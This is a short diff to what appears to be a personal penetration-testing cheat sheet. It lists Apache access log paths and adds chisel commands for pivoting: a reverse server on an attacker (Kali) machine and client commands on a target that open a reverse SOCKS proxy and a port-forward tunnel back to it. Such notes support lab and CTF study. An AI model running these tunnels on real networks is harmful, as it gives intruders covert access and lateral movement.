@@ -93,3 +93,15 @@ common log apache:
 • /var/log/apache/access.log
 • /var/log/apache2/access.log
 • /etc/httpd/logs/access_log
+
+chisel
+-----------
+chisel pivot
+server on linux
+./chisel server -p 8000 --reverse
+client on win10
+chisel client 192.168.1.2:8000 R:socks
+
+tunneling port:
+di kali: chisel server --socks5 --reverse -p 1234
+di target: chisel.exe client iptun0:1234 R:9090:127.0.0.1:9090
